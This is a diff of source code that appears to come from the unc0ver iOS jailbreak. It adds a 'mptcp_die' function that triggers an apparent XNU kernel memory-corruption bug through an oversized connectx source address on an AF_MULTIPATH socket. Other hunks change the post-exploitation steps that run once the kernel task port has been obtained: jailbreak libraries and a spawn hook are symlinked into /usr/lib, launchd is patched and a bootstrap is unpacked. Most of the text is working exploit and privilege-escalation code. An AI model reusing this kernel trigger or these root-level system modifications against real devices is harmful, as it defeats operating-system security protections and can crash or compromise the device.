@@ -772,7 +772,7 @@ int message_size_for_kalloc_size(int kalloc_size) {
     return ((3*kalloc_size)/4) - 0x74;
 }
 
-int die() {
+int vfs_die() {
     int fd = open("/", O_RDONLY);
     if (fd == -1) {
         perror("unable to open fs root\n");
@@ -794,7 +794,52 @@ int die() {
     return 0;
 }
 
-void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, char *boot_nonce)
+#define AF_MULTIPATH 39
+
+int mptcp_die() {
+    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
+    if (sock < 0) {
+        printf("socket failed\n");
+        perror("");
+        return 0;
+    }
+    printf("got socket: %d\n", sock);
+    
+    struct sockaddr* sockaddr_src = malloc(256);
+    memset(sockaddr_src, 'A', 256);
+    sockaddr_src->sa_len = 220;
+    sockaddr_src->sa_family = 'B';
+    
+    struct sockaddr* sockaddr_dst = malloc(256);
+    memset(sockaddr_dst, 'A', 256);
+    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
+    sockaddr_dst->sa_family = AF_INET6;
+    
+    sa_endpoints_t eps = {0};
+    eps.sae_srcif = 0;
+    eps.sae_srcaddr = sockaddr_src;
+    eps.sae_srcaddrlen = 220;
+    eps.sae_dstaddr = sockaddr_dst;
+    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
+    
+    int err = connectx(
+                       sock,
+                       &eps,
+                       SAE_ASSOCID_ANY,
+                       0,
+                       NULL,
+                       0,
+                       NULL,
+                       NULL);
+    
+    printf("err: %d\n", err);
+    
+    close(sock);
+    
+    return 0;
+}
+
+void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce)
 {
     // Initialize variables.
     int rv = 0;
@@ -1166,6 +1211,15 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             _assert(rv == 0);
         }
         
+        if (!access("/electra", F_OK)) {
+            rv = rmdir("/electra");
+            LOG("rv: " "%d" "\n", rv);
+            _assert(rv == 0);
+        }
+        rv = symlink("/jb", "/electra");
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        
         rv = chdir("/jb");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
@@ -1411,7 +1465,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
         }
-        rv = rename("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
+        rv = symlink("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         if (!access("/bin/launchctl", F_OK)) {
@@ -1453,7 +1507,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
         }
-        rv = rename("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
+        rv = symlink("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Patching launchd...");
@@ -1498,7 +1552,6 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = execCommandAndWait("/jb/tar", "-xvpkf", "/var/tmp/strap.tar", NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 512 || rv == 0);
-            dsystem("/usr/libexec/cydia/firmware.sh");
             rv = fclose(fopen("/.installed_unc0ver", "w"));
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
@@ -1682,7 +1735,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     if (strstr(u.version, DEFAULT_VERSION_STRING)) {
         dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
             dispatch_async(dispatch_get_main_queue(), ^{
-                [self.goButton setTitle:NSLocalizedString(@"Jailbroken", nil) forState:UIControlStateDisabled];
+                [self.goButton setTitle:@"Jailbroken" forState:UIControlStateDisabled];
                 [self.goButton setEnabled:NO];
             });
         });
